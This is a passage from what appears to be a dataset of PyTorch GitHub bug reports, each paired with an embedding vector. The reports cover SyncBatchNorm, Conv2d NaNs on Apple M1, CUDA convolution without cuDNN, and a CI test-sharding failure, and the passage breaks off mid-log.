  0.08181054  0.14063595  0.10768079  0.22004639  0.04796882 -0.1620681
  0.01979167  0.04621884  0.10207228 -0.02375787 -0.4526765   0.03314252
  0.04346063 -0.18076213 -0.25650293  0.2212947   0.11442043  0.13404794
 -0.06382391 -0.09872423  0.21445304 -0.01261692  0.49204516  0.07069913
 -0.18658802 -0.08622164  0.11952743  0.12904346 -0.01934512 -0.3015656
 -0.14550146 -0.2061213   0.11203115 -0.2650475  -0.08713112 -0.24504085
  0.07387611  0.16951749 -0.04911049  0.21309154  0.12061734  0.09434174
 -0.03560941  0.14974676 -0.28787395  0.58462334  0.08591428 -0.0946914
  0.27845675 -0.1089687   0.41258842 -0.32438248 -0.1590441   0.4279227
 -0.09231639 -0.09499634  0.18780796  0.03878525 -0.36282128 -0.07333051
 -0.11801934 -0.0146794  -0.36201656 -0.04921328  0.0325266  -0.57449245
  0.18144636  0.25895354 -0.25666204 -0.1409088   0.11148792  0.1198426
  0.22498909  0.39254567  0.24323976  0.08504744  0.19463997 -0.23720756
  0.22218834  0.05603441  0.05704373 -0.10268857 -0.23979129  0.14380643
  0.3027951  -0.10871889  0.19117902 -0.25721666  0.04815698  0.16072303
  0.25127342  0.03492301  0.02541718  0.1189193   0.11493916  0.26937243
 -0.09317231 -0.11009266 -0.42187303 -0.00254243  0.01681428  0.28877926
 -0.19680552 -0.43999806 -0.30660993 -0.03390011 -0.45481437  0.08240394
  0.05116967  0.35822475  0.2765224   0.15684569 -0.10617816  0.13163851
 -0.23085056 -0.20244566 -0.02721249  0.05080198  0.10433713  0.04234308
  0.10847085 -0.06873804 -0.12694597 -0.06835839 -0.07958402  0.2601526
 -0.04349709  0.01777056 -0.06575385  0.01619965  0.13307862  0.1187418
 -0.13823815 -0.16100764 -0.24629897 -0.19534954  0.01322794 -0.04996311
  0.04702533 -0.09877492 -0.3692089   0.25775504 -0.29965886 -0.14353202
  0.5789733  -0.15962285  0.04291753  0.11375047  0.18415588 -0.25308323
  0.18805218 -0.09019214 -0.06855435  0.22067952 -0.01841608  0.21914013
 -0.02739195  0.04137582 -0.16709724  0.25742805 -0.00144768 -0.24286671
  0.199357   -0.2664883  -0.06715156  0.14078516  0.12538856 -0.10358538
  0.511117   -0.01063479  0.09088063 -0.02664951  0.1407499   0.3978354
  0.09022743  0.15595062  0.2844838  -0.06884349  0.10355836 -0.17568228
 -0.27595937  0.20738988  0.0017399   0.15316069  0.28581655  0.13680017
 -0.05124699  0.08929294  0.31656975 -0.19529909  0.03202091 -0.19502875
 -0.43145642  0.02417552  0.08294625 -0.04112484 -0.48600674  0.17402244
  0.03794231  0.2943806   0.3219651  -0.39690033  0.4834879   0.30884802
 -0.24630529  0.169018   -0.14142849  0.05301035 -0.09272541  0.5994506
  0.2292327  -0.01318823 -0.41311353 -0.4228174  -0.20925958  0.10436781
  0.60222363  0.04715994 -0.08915819  0.14635329 -0.10464567  0.3861465
  0.26747775 -0.25566423  0.12850054  0.11869028  0.44690222 -0.17348686
 -0.0180496  -0.00090017  0.00694391 -0.13488647  0.03116597 -0.01824185
  0.02278685 -0.09069721 -0.03819742  0.02373256 -0.08172373  0.5016929
 -0.10855184 -0.14961964 -0.01996614  0.10153878 -0.05530091 -0.33503357
 -0.23157524  0.47810143 -0.0756651   0.17444836 -0.01339096  0.07222998
 -0.5419377   0.23809141 -0.1126159   0.06785182  0.29688716 -0.22220537
 -0.37830418 -0.00470597  0.1856586   0.23693627 -0.39744806  0.21875665
  0.21228483  0.21518189  0.20912215  0.0636006   0.1984762  -0.2447499
  0.0282021   0.24743769 -0.13721454 -0.10432471 -0.19850914 -0.36550266]"
SyncBatchNorm raises exception when affine=False high priority module: nn triaged module: data parallel,"## ðŸ› Bug

In nn.SyncBatchNorm:

There is a call to weight.contiguous() there:
https://github.com/pytorch/pytorch/blob/27048c1dfa80effabf17b8dca66cd2724dd502f8/torch/nn/modules/_functions.py#L12

But weight can be None if affine = False.
https://github.com/pytorch/pytorch/blob/27048c1dfa80effabf17b8dca66cd2724dd502f8/torch/nn/modules/batchnorm.py#L44 

So it crashes.

Bug was introduced in:
https://github.com/pytorch/pytorch/commit/d30f4d1dfd5237d89834363ce2cff9de4ee92811


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @albanD @mruberry",True,"[-5.24895668e-01 -6.84522688e-02 -2.25957900e-01  9.22365189e-02
 -2.37755664e-03 -2.99234748e-01 -4.48268130e-02  2.70761251e-01
 -2.69792855e-01 -3.05916011e-01  1.25676811e-01 -1.90259561e-01
  1.50857836e-01 -8.87683481e-02 -1.24845698e-01  1.34210289e-01
  1.58550218e-04 -6.15613349e-03  6.69308156e-02 -2.68944819e-03
  1.00052245e-01 -6.09634891e-02 -1.09952286e-01 -1.07003957e-01
  1.04063272e-01 -1.46017745e-01 -1.74506485e-01 -4.37274724e-02
  5.93641773e-02  7.00416639e-02  1.28412396e-01  2.55201384e-02
 -4.63649690e-01  3.37590799e-02  3.39934349e-01 -1.02307945e-02
 -4.80331600e-01 -4.48244691e-01 -1.97981328e-01  1.30558968e-01
  6.97824210e-02  2.08996683e-01  2.11742312e-01 -1.57659739e-01
 -2.80288279e-01  1.73527420e-01 -2.61493683e-01  3.24551046e-01
 -1.23593003e-01  1.01783909e-01  1.17294267e-01  1.30216628e-01
 -8.62933695e-02 -4.46151912e-01  1.18678614e-01 -2.57302344e-01
 -1.21205539e-01  5.62302358e-02 -2.19420701e-01 -8.37409496e-03
  5.49079537e-01 -2.11797327e-01  1.52347803e-01  1.31041333e-02
  9.85002667e-02  1.59281820e-01  1.00413799e-01  8.44274908e-02
  1.80006623e-01  6.46989718e-02  2.02683717e-01 -6.72683716e-02
 -2.71484196e-01 -1.20604504e-02  5.42119205e-01 -7.98337609e-02
 -2.48753518e-01  3.70375395e-01 -8.08426067e-02 -1.98222622e-01
 -3.44713509e-01  1.31245434e-01  6.39321655e-02 -3.59491706e-01
  2.31667552e-02 -6.66329190e-02  2.49459684e-01  1.21900506e-01
 -8.39827955e-02 -3.91733833e-04  2.60399014e-01  4.46396023e-02
 -1.62701517e-01  5.03287315e-01  1.21556960e-01  3.15023124e-01
 -2.06710771e-01  9.55118239e-02 -3.94773662e-01 -3.50963712e-01
 -1.64476603e-01 -2.72120476e-01 -2.52874196e-01  5.81677079e-01
 -1.08923957e-01 -2.16263413e-01  2.74252653e-01  1.30426347e-01
 -3.54360640e-02  9.59381238e-02  2.57608682e-01  1.63334191e-01
  4.44977507e-02 -1.17838550e-02 -9.91879404e-03 -5.66691682e-02
  2.07017779e-01 -5.77017218e-02 -3.26710910e-01  1.63978949e-01
 -3.74430120e-01 -4.65561524e-02 -3.11152190e-01 -7.08995461e-02
  1.93468243e-01  4.13517207e-02  7.07260817e-02  1.01389147e-01
 -2.30907232e-01 -2.29994565e-01  1.00052223e-01 -3.61136757e-02
  3.01509917e-01 -1.65498629e-01  1.62064776e-01  2.74506900e-02
 -4.30620104e-01 -6.86758906e-02 -2.00144321e-01 -1.20412961e-01
 -1.01940438e-01 -3.17520648e-02 -1.71278477e-01 -4.75166321e-01
  3.31648290e-01  2.79871345e-01 -1.34956121e-01 -7.33029619e-02
 -1.67628407e-01  2.04671249e-02  3.33460510e-01 -4.06192876e-02
 -1.93251610e-01  4.94797379e-01 -3.86169553e-02  1.42026514e-01
  3.13375771e-01 -5.90844080e-03  3.10738802e-01 -4.08376306e-01
 -1.11908294e-01  3.10735911e-01  1.30138062e-02 -9.49786752e-02
  2.76778460e-01 -4.79271784e-02 -5.96800327e-01 -2.67338660e-02
 -2.28160664e-01  2.84458026e-02 -2.89101541e-01 -4.15202416e-03
 -6.54809773e-02  2.78212782e-02  2.73037106e-01 -1.80716544e-01
 -6.30543381e-02 -2.49963671e-01 -1.93685174e-01  1.84450120e-01
  2.30176687e-01 -4.94857877e-02  2.42151707e-01 -3.33938479e-01
  6.69938102e-02  2.55246669e-01  1.96103007e-02  2.38452360e-01
 -2.05249459e-01 -2.74023890e-01 -2.48308986e-01  1.32736247e-02
  1.20611660e-01  7.62394909e-03  1.36126518e-01 -4.00403172e-01
  3.46432745e-01  1.70608386e-01  3.37775916e-01 -8.83761793e-02
  8.73720795e-02  3.17554533e-01  4.46331590e-01  4.48041037e-02
  5.49988411e-02 -9.18948650e-02 -2.04120860e-01 -3.64403903e-01
  9.95266289e-02  3.75384331e-01 -1.30061328e-01 -2.95157313e-01
 -4.67642784e-01 -1.53552800e-01 -2.50106782e-01  4.02834415e-01
  6.73907176e-02  2.41111413e-01 -1.81734376e-02  8.99003819e-02
  2.65442312e-01 -1.56438529e-01 -5.44808097e-02 -3.81965637e-01
  1.86979026e-01  1.69414639e-01  2.58505978e-02 -5.22975847e-02
  2.09993333e-01  1.20991975e-01 -5.56996465e-03 -2.42536813e-01
 -1.63646013e-01  1.94582611e-01  1.77666008e-01  6.65993392e-02
 -2.30414700e-02 -3.65802385e-02 -1.54214755e-01  1.99844390e-01
  7.36964494e-03 -3.50355804e-01 -1.36457860e-01 -1.44243509e-01
  5.19909024e-01  1.12318695e-01 -4.25457284e-02  6.52178824e-02
 -2.12123632e-01  1.65316686e-01 -3.21833521e-01 -6.62364215e-02
  1.28912181e-03 -1.50905132e-01  2.67970383e-01  2.36838013e-02
  3.72293770e-01 -9.84558612e-02 -1.19344816e-01 -3.36878330e-01
  2.41288006e-01  4.16326910e-01 -2.85308957e-01  3.04733992e-01
  3.24160278e-01 -6.15683645e-02 -1.73881799e-01  1.71370685e-01
 -1.03022054e-01 -2.77243227e-01  5.20643413e-01 -5.89478374e-01
  2.02695310e-01 -5.78586757e-02  2.29106188e-01 -2.93892443e-01
  7.45320857e-01 -1.27579644e-01 -6.35068268e-02  3.19383442e-01
 -1.31415293e-01  4.33408245e-02  2.61071205e-01  3.22653234e-01
  4.91952598e-01 -3.44330430e-01 -2.94271596e-02 -6.14686906e-02
 -2.29463384e-01  5.38556464e-02 -2.79731452e-02  1.32085055e-01
  3.26470077e-01  1.26729384e-02 -2.43545562e-01  7.41455853e-02
  3.61656666e-01 -5.25826029e-02  2.30434686e-01 -2.05523729e-01
 -1.63765758e-01  9.85313505e-02  1.16380982e-01 -1.42028302e-01
 -3.69177192e-01 -1.25117302e-01 -2.32190825e-02  1.23362809e-01
  3.55316430e-01 -5.18904209e-01  5.07890701e-01  8.94745737e-02
 -1.10522859e-01  4.98067260e-01 -3.00348699e-01  1.80887997e-01
 -8.57480392e-02  3.75513405e-01  1.90070301e-01  1.35156244e-01
 -1.15313798e-01 -4.59456742e-01 -2.98557132e-01  2.32106838e-02
  1.75977349e-01  8.11971277e-02 -2.54705071e-01 -1.59904569e-01
 -8.84298682e-02  4.33857948e-01  5.85939921e-02 -4.31298614e-02
  1.35997981e-01 -3.03775351e-02  6.88199177e-02 -1.25679508e-01
 -8.74113292e-04  2.29070961e-01  4.11206484e-02 -2.02156410e-01
 -2.05885530e-01 -9.85943712e-03  2.28947312e-01 -2.27620900e-02
 -1.67623535e-02 -1.95090622e-01 -4.71618250e-02  4.16726828e-01
  1.30390257e-01  2.61853822e-03 -4.30713706e-02 -1.60297915e-01
 -5.92838749e-02 -7.89221749e-02 -3.88410151e-01  3.93047720e-01
 -3.32928926e-01  2.27658764e-01  1.84159771e-01  2.77568549e-01
 -3.15808617e-02  2.10263878e-01 -1.10017717e-01  1.54916808e-01
  1.11251660e-01 -1.01222537e-01 -2.88664103e-01 -3.56373787e-02
 -1.26747712e-02  3.04814637e-01 -2.23543450e-01  4.92753386e-02
  1.16765946e-01  5.88691980e-02  4.49693315e-02 -3.08754444e-01
  1.84036642e-01  1.65531099e-01 -1.37455970e-01  3.00043255e-01
  2.28621103e-02 -3.96469533e-02  1.25405714e-02  5.39958328e-02]"
Conv2d on Apple M1 returns NaN's high priority module: convolution triaged module: macos module: correctness (silent) module: arm,"## ðŸ› Bug

Convolutional layer Conv2d on M1 randomly returns NaN's
(by randomly I mean it happens approximately every fourth time layer being called)

## To Reproduce

```
import torch

conv = torch.nn.Conv2d(1, 16, 3, stride=1)
for c in range(100):
	x = torch.randn(1, 80, 140)
	x = x.unsqueeze(1)
	x = conv(x)
	if torch.isnan(torch.sum(x)):
		print(c)
```

## Expected behavior

Conv2d shouldn't return NaNs

## Environment

Collecting environment information...
PyTorch version: 1.9.0a0+gitd54be1a
Is debug build: False
CUDA used to build PyTorch: None
ROCM used to build PyTorch: N/A

OS: macOS 11.2.3 (arm64)
GCC version: Could not collect
Clang version: 12.0.0 (clang-1200.0.32.29)
CMake version: version 3.19.6

Python version: 3.8 (64-bit runtime)
Is CUDA available: False
CUDA runtime version: No CUDA
GPU models and configuration: No CUDA
Nvidia driver version: No CUDA
cuDNN version: No CUDA
HIP runtime version: N/A
MIOpen runtime version: N/A

Versions of relevant libraries:
[pip3] numpy==1.20.1
[pip3] torch==1.9.0a0+gitd54be1a
[pip3] torchvision==0.9.0a0+414427d
[conda] numpy                     1.20.1           py38h9e6c65a_0    conda-forge
[conda] torch                     1.9.0a0+gitd54be1a          pypi_0    pypi
[conda] torchvision               0.9.0a0+414427d          pypi_0    pypi

## Additional context



cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411 @malfet",True,"[-2.61507571e-01  4.59232181e-02 -8.04505348e-02 -1.45822227e-01
 -9.31345522e-02 -1.54850870e-01  8.88219476e-02  1.10162705e-01
 -3.22031051e-01  1.69690978e-02  4.32391278e-02 -1.92026898e-01
 -1.81962907e-01  2.22186506e-01 -1.97123408e-01  1.33389354e-01
 -4.20109481e-01 -5.25769815e-02 -1.55927420e-01  1.45763621e-01
  1.27950653e-01 -1.70588866e-01 -1.72299966e-01 -1.41137257e-01
  1.25013202e-01  2.60599732e-01  7.13028461e-02  1.58630148e-01
  2.54683733e-01  2.02797353e-04 -1.18092969e-01 -4.97781001e-02
 -6.13004565e-01  3.05822611e-01 -4.16807011e-02 -9.65126697e-03
 -2.88198769e-01 -1.98276639e-01 -3.75909835e-01 -1.81199297e-01
  2.60830283e-01  3.56648505e-01  5.37089445e-02  6.35175779e-02
 -4.37177010e-02  4.23457801e-01  3.85774113e-02  1.63218766e-01
 -8.34915191e-02 -2.27432072e-01  3.02554742e-02  1.42180100e-01
  1.30159616e-01 -1.09053090e-01 -9.12443995e-02  5.15648872e-02
 -1.27546445e-01 -2.58899570e-01  2.67804682e-01 -1.91628307e-01
  5.06460071e-02 -9.70635563e-03  2.22202241e-01 -2.42758051e-01
  3.10249805e-01 -9.10284817e-02 -2.30745792e-01  1.04249671e-01
  1.10736281e-01  1.65484268e-02  1.19937673e-01  7.93558434e-02
 -2.97132611e-01  6.26478791e-02  4.17879149e-02  1.60677642e-01
 -3.40691030e-01  7.21171405e-03 -1.66190431e-01 -1.48483068e-01
  4.12938483e-02  2.13883519e-02 -2.71467686e-01 -1.74857110e-01
  1.95900798e-01 -1.23014227e-01  3.33585203e-01 -1.93241894e-01
  3.08327347e-01  3.81138653e-01  1.86700463e-01  2.51540840e-01
 -1.84567571e-01  1.65658966e-01  1.16452709e-01  3.37484702e-02
  4.64838892e-01 -1.05808489e-01 -1.37278959e-01 -7.28585795e-02
 -1.01796530e-01 -3.20402682e-01 -2.53829360e-01  1.02365643e-01
 -6.22875281e-02 -2.96764076e-01  2.00521395e-01  1.24210134e-01
  3.39180827e-02 -3.13121602e-02  1.06533557e-01 -8.51653144e-02
  6.52754903e-02 -2.53782608e-04  5.05991802e-02  2.68944222e-02
 -7.62201026e-02 -8.66766423e-02  1.25150234e-02  3.80955637e-03
 -3.51263769e-02  4.56253402e-02  2.14370936e-01  1.09039091e-01
  3.10105234e-01  8.45227689e-02  1.00125052e-01 -1.29698813e-01
 -2.33786345e-01 -2.32543439e-01 -2.53382213e-02  1.45130172e-01
  1.73641875e-01 -7.42869675e-02  1.45210147e-01  3.96169782e-01
 -2.25398540e-01 -2.39202663e-01 -2.70133734e-01 -1.93892777e-01
 -2.48072390e-02  2.28883266e-01 -3.65026504e-01 -2.34852701e-01
  5.51515698e-01 -1.85929567e-01 -2.73839593e-01 -8.16628896e-03
  9.97449178e-03 -2.08049029e-01  2.47307420e-01 -1.00204095e-01
 -1.98472589e-01  1.85810581e-01  1.34440482e-01 -2.63081584e-02
  3.02923858e-01  4.46738526e-02  3.51014793e-01 -1.78488418e-01
  2.40335539e-01  1.39844269e-01  1.75493717e-01  2.76817501e-01
  3.01233500e-01  4.02670950e-02 -4.42331582e-02 -1.04969367e-01
 -3.22824955e-01  1.63230762e-01 -3.12967040e-02 -3.86525869e-01
 -3.23200941e-01 -1.66745573e-01  2.24752024e-01 -4.18902189e-01
 -4.28784490e-01 -1.01118565e-01 -2.32736077e-02  1.81795239e-01
  5.85763715e-02  3.39026451e-01  2.01156721e-01  1.70602217e-01
 -3.95745318e-03 -3.81587893e-02  1.33487731e-01  2.08246529e-01
 -2.54872859e-01  1.97143108e-01 -2.81295419e-01  4.30287644e-02
  5.74076995e-02 -2.67275888e-02  1.64132476e-01 -3.20660956e-02
  1.84618846e-01  2.02415526e-01 -9.18553546e-02 -1.89246029e-01
  5.23845572e-03 -1.40652001e-01  1.50964204e-02 -8.80912691e-02
 -2.11694583e-01 -1.08741343e-01 -1.89136967e-01 -3.01073074e-01
 -3.91066194e-01  3.08806598e-01 -3.52567136e-02 -1.80195525e-01
  1.06494561e-01 -1.71689287e-01  1.14961617e-01  9.62811112e-02
 -1.63613573e-01 -1.99705690e-01  5.63922599e-02  2.53405180e-02
  3.31183374e-01 -2.18638673e-01  8.81845281e-02 -1.46589369e-01
  5.64737581e-02  4.80381101e-02 -9.13058892e-02  1.21933728e-01
 -5.04512340e-02  4.98833731e-02  4.72276956e-02  3.89169529e-02
  1.27720550e-01 -2.04659291e-02  1.94276005e-01  3.11972499e-02
 -2.06422769e-02 -2.14154571e-02  1.64470524e-01 -1.61927611e-01
 -2.25735158e-01 -9.53306109e-02  3.68516624e-01 -4.69386298e-03
  1.42945364e-01  8.28634724e-02 -1.05758369e-01 -2.35061437e-01
 -7.14760944e-02 -1.74615264e-01 -4.13437337e-02  6.06009252e-02
  6.65972456e-02 -2.25361466e-01  2.13038102e-02  2.10949197e-01
  8.99660289e-02 -2.76242107e-01 -1.56325698e-01 -2.82684982e-01
  3.37728769e-01  2.10522711e-01  2.19109699e-01  2.54688680e-01
  9.59610343e-02  6.75789565e-02 -1.59211457e-01  1.75486520e-01
 -1.89151108e-01  1.13899127e-01  2.16192842e-01 -5.03713451e-03
  5.77512026e-01  1.55124202e-01  3.53868008e-01 -2.61524200e-01
  7.41499215e-02 -1.55751407e-01 -8.23048055e-02 -1.04999855e-01
 -1.28880460e-02  3.50715697e-01 -8.07687938e-02  2.54305333e-01
  2.50214249e-01 -4.66464579e-01 -1.34024337e-01 -4.07516122e-01
 -6.11110218e-02 -1.10733382e-01 -6.82102814e-02  9.16156471e-02
  4.45827305e-01 -1.74494356e-01 -1.80778205e-01  1.59359545e-01
  4.42918897e-01 -2.15293765e-01 -1.69771254e-01 -1.25195071e-01
 -5.14016673e-02  2.39686430e-01  5.01053333e-01 -2.70147562e-01
 -1.80163354e-01 -2.55502593e-02  9.24431831e-02  1.29421592e-01
  3.71834040e-01 -3.29992861e-01  4.87025648e-01 -6.03219382e-02
 -2.73056805e-01  2.81218946e-01 -1.85677439e-01  1.00692332e-01
  2.00947672e-02  2.79704511e-01  9.16505754e-02  1.26154795e-01
 -2.15018075e-02  5.00070788e-02 -2.95951933e-01  2.28038117e-01
  2.67568588e-01  2.30941415e-01 -2.37912863e-01  3.49976897e-01
  7.69766467e-03  8.77153873e-02  2.67206609e-01 -7.08255991e-02
  3.80210951e-02  1.62894517e-01 -9.83466208e-02 -5.70183061e-03
 -2.61664391e-01  1.90368682e-01  2.41465438e-02 -2.28614956e-01
 -2.45961562e-01 -6.61026016e-02  8.14853162e-02 -3.77251022e-03
 -8.88751745e-02 -1.00694336e-01  7.20366538e-02  2.85800919e-02
 -2.47403160e-02 -3.96316499e-03 -2.69895762e-01 -9.76840183e-02
  2.26458281e-01  7.69413412e-02 -2.14462996e-01  3.99573445e-01
 -4.04347837e-01 -1.37973934e-01  2.39827767e-01 -5.22749983e-02
  4.60868999e-02 -6.34116158e-02 -3.96181643e-01 -7.92360008e-02
 -1.92088649e-01  1.64565071e-01 -1.42341435e-01 -1.65711030e-01
 -1.22447938e-01  2.31354952e-01 -1.24257684e-01  3.26734371e-02
  2.21845135e-01  1.34114116e-01  3.64616990e-01 -2.82217562e-01
  6.80196360e-02 -1.09959051e-01  4.36079875e-02  5.79821989e-02
  1.30632132e-01  1.68442428e-01 -3.21085155e-01 -1.46963716e-01]"
Silently incorrect convolution on CUDA without cuDNN high priority triaged,"## ðŸ› Bug

```
import torch
import torch.nn as nn
model = nn.Conv2d(64, 128, [1, 1], [2, 2], [0, 0])
x = torch.randn(1, 64, 8, 8)

model.cuda()
result_cudnn = model(x.cuda())

torch.backends.cudnn.enabled=False
result = model(x.cuda())

assert torch.allclose(result, result_cudnn)
```
The above code asserts. This convolution (with batch size > 1) is important because it's present in resnet; the bug makes it so that resnet stops training. I guess I am the first person to run into this so the conclusion may be that no one uses CUDA convolutions without cudnn.

## Additional context

On master, but I can provide more information as necessary.


cc @ezyang @gchanan @zou3519 @bdhirsh @jbschlosser @anjali411",True,"[-0.53666687 -0.05662447 -0.3550746   0.17233314 -0.10350823 -0.18518195
 -0.17203897  0.1895346  -0.1966522   0.04283099 -0.01781183 -0.09290638
 -0.03888039 -0.06624918 -0.4680767  -0.15598255 -0.23224844 -0.05091548
 -0.2950989   0.02326306  0.02624802  0.00588407 -0.05020648 -0.11041173
  0.28984678 -0.03004146 -0.21369267 -0.08001959  0.4149527  -0.22451735
 -0.02110774 -0.2003638  -0.46575707  0.4695061   0.04625051 -0.12125972
 -0.5754137  -0.24780712  0.00726977 -0.15382464  0.01979358  0.12082143
 -0.02621315 -0.20880023  0.05008067  0.08020994 -0.02754611  0.1420949
 -0.09674022 -0.14641468  0.23489012  0.17358935 -0.02268178 -0.08081969
  0.0061552  -0.13963418 -0.15749124 -0.11036743  0.21030354 -0.3202262
  0.30527085 -0.03348812 -0.02124465 -0.20368731  0.23444486 -0.15934116
 -0.36119324  0.05275381  0.5443043  -0.18728     0.17236054  0.2711388
 -0.03477845  0.00701112  0.11320835  0.08303936 -0.12465598  0.2225478
 -0.40174794 -0.27918905  0.28288907  0.16012052 -0.07530874 -0.13087101
  0.23302117 -0.00993848  0.34293145 -0.15333378  0.34230977  0.07612509
  0.133295    0.21617135 -0.02632761  0.37807527 -0.1913046  -0.01819921
  0.23350003  0.08487949 -0.27566367 -0.21932383 -0.3134985  -0.3669716
 -0.1746475   0.37140065  0.12768844 -0.09996291  0.08805524  0.12452871
 -0.064966   -0.09245522  0.36898798  0.0666645  -0.00572138 -0.20373878
 -0.12817872 -0.13152336 -0.41754088 -0.32198918 -0.12176566 -0.11673583
 -0.09397034  0.30150053  0.24830283  0.02292681  0.3575796   0.05549329
  0.25546226 -0.1944148  -0.32425284  0.05519248 -0.02508233 -0.06893936
  0.2897077  -0.11576264  0.20369704  0.24063563 -0.3938657  -0.13505405
 -0.18883276 -0.08633158 -0.26336095  0.08398788 -0.19112659 -0.08169858
  0.24148296 -0.22309428 -0.11845507  0.07106251  0.30471617 -0.03522049
  0.18421495 -0.2594944  -0.46889284  0.15315132  0.05114403  0.10796868
  0.11306668 -0.05653542  0.30199277 -0.26847053  0.50116825  0.15323317
  0.33368045  0.14717616  0.315898    0.24935839  0.02164023  0.13095185
 -0.26677012  0.22032149 -0.04953092 -0.28772095 -0.04989336 -0.10046063
  0.10280813 -0.16819787 -0.5591758  -0.17419377 -0.21444744  0.4300875
  0.14823765  0.43336782  0.23184653 -0.17260091  0.08365133  0.10216643
  0.33314526  0.00800542 -0.39414847 -0.08450002 -0.2905035  -0.09794304
  0.04469635  0.09964852 -0.05577416  0.14509612  0.11982958 -0.15648955
 -0.06685063 -0.20577845 -0.40150863 -0.14102748  0.04460684 -0.0714784
 -0.17162184 -0.0562409  -0.3376074  -0.31648546 -0.07722046  0.19361226
 -0.5347117  -0.05193583 -0.16361874 -0.1743424   0.13423929  0.02900891
 -0.05357297 -0.11482742 -0.01675151  0.3096683   0.74851775 -0.22774455
  0.41545516 -0.02041663  0.3226116   0.3152174  -0.06908076 -0.02947886
  0.10265772 -0.00404087 -0.03168778 -0.2965426  -0.00933808  0.13740253
  0.19454661  0.34803063 -0.06470989  0.01903178  0.10554957  0.02479842
 -0.06765604  0.15211181  0.0557965  -0.08589588 -0.10660657  0.1150464
 -0.39738864  0.01357313 -0.27299777 -0.27975038 -0.09230191  0.07209235
  0.04881745 -0.1390741   0.27321938  0.14372945  0.21744943 -0.07953779
 -0.2061181   0.2180687   0.3272035   0.34913328 -0.08603399  0.13209648
  0.30457225 -0.10096377 -0.19027245  0.13476817 -0.31017485  0.08209784
 -0.04038292 -0.16993445  0.21544477  0.17248783  0.45708364 -0.21809098
  0.15806401 -0.15483838  0.10118827 -0.1540522   0.44435087  0.10158773
 -0.04036243  0.01177378  0.3609444  -0.28813025 -0.11215311 -0.07149924
 -0.10835394 -0.38473395 -0.29504564  0.13478069  0.48116493 -0.38437942
 -0.5632423   0.12054566  0.3899556  -0.07135575 -0.11739814 -0.25673455
 -0.2904024   0.1594121   0.41312736 -0.26671955 -0.29995853 -0.09409612
  0.24554348  0.21054302  0.40583137 -0.25471324  0.46823755 -0.2940932
 -0.2656455   0.40562004 -0.13458678  0.12465461  0.36600745  0.104561
  0.2561054   0.15392561 -0.3156845  -0.2984926  -0.17950675  0.05798776
  0.12999347  0.15500794 -0.11737818  0.3371153   0.10065151  0.36648566
  0.1387308   0.08373229  0.31325123  0.10376506 -0.25706184  0.02117988
  0.0307465   0.21889213  0.17408064 -0.24163969 -0.22296017  0.01481194
 -0.14453468 -0.22153988 -0.12439774 -0.19340639 -0.04901894  0.2627005
 -0.11208697  0.07444479 -0.05048341 -0.00500856  0.34456593  0.24743044
  0.17074972  0.47508687  0.04301982  0.05032083  0.06556044 -0.27302215
  0.16629496  0.27401328 -0.19204718 -0.21410969 -0.12012149 -0.0476519
 -0.09302897 -0.29303938  0.09492277  0.17542115 -0.2161513   0.13903421
  0.21673699  0.20857713  0.49137124 -0.27444848 -0.15013185 -0.11330532
  0.2628945   0.01528891  0.08682469  0.05682753 -0.19508135 -0.09484982]"
"""Report Results"" test intermittently fails for unsharded tests with ""Duplicate test case..."" module: ci triaged","See https://app.circleci.com/pipelines/github/pytorch/pytorch/284234/workflows/a9fb7db0-33f6-4364-9ec0-16dfb35052c6/jobs/11485715 for example:
```
Mar 12 01:36:17     raise RuntimeWarning(f'Duplicate test case {test_case.name} in suite {suite_name} called from {self.name}')
Mar 12 01:36:17 RuntimeWarning: Duplicate test case test_AdaptiveMaxPool1d_indices_cpu_float32 in suite TestNNDeviceTypeCPU called from test_nn
```

This happens because test_nn was selected twice, first time into shard1 when AWS was unaccessible and 2nd time into shard 2, when AWS becomes accessible:
```
Mar 11 23:59:28 + test_python_shard1
Mar 11 23:59:28 + python test/run_test.py --exclude-jit-executor --shard 1 2 --verbose --determine-from=
Mar 11 23:59:30 Grabbing reports from nightly commit: 30b9583650c9d9ad4e1172c92bf57ec3f255061b
Mar 11 23:59:30 Selected tests: test_autograd, test_nn, distributed/rpc/test_process_group_agent, test_unary_ufuncs, test_jit, test_xnnpack_integration, distributed/rpc/test_faulty_agent, distributed/test_distributed_fork, test_cpp_extensions_jit, test_dataloader, test_tensor_creation_ops, test_type_hints, test_tensorboard, test_binary_ufuncs, test_sparse, test_multiprocessing, test_determination, test_foreach, test_utils, test_view_ops, distributed/test_c10d_spawn, test_cpp_api_parity, test_multiprocessing_spawn, test_openmp, test_vmap, test_mobile_optimizer, test_shape_ops, test_indexing, test_namedtuple_return_api, test_namedtensor, test_logging, test_jit_py3, benchmark_utils/test_benchmark_utils, distributed/test_nccl, test_futures, test_bundled_inputs, test_jit_disabled, test_function_schema, test_cpp_extensions_aot_ninja, distributed/test_jit_c10d, test_pytree, test_show_pickle, test_license, distributed/nn/jit/test_instantiator, test_public_bindings, test_vulkan, test_dataset, distributions/test_constraints, test_pruning_op, distributed/pipeline/sync/skip/test_api, distributed/pipeline/sync/skip/test_gpipe, distributed/pipeline/sync/skip/test_inspect_skip_layout, distributed/pipeline/sync/skip/test_leak, distributed/pipeline/sync/skip/test_portal, distributed/pipeline/sync/skip/test_stash_pop, distributed/pipeline/sync/skip/test_tracker, distributed/pipeline/sync/skip/test_verify_skippables, distributed/pipeline/sync/test_balance, distributed/pipeline/sync/test_bugs, distributed/pipeline/sync/test_checkpoint, distributed/pipeline/sync/test_copy, distributed/pipeline/sync/test_deferred_batch_norm, distributed/pipeline/sync/test_dependency, distributed/pipeline/sync/test_inplace, distributed/pipeline/sync/test_microbatch, distributed/pipeline/sync/test_phony, distributed/pipeline/sync/test_pipe, distributed/pipeline/sync/test_pipeline, distributed/pipeline/sync/test_stream, distributed/pipeline/sync/test_transparency, distributed/pipeline/sync/test_worker
...
Mar 12 00:47:02 + test_python_shard2
Mar 12 00:47:02 + python test/run_test.py --exclude-jit-executor --shard 2 2 --verbose --determine-from=
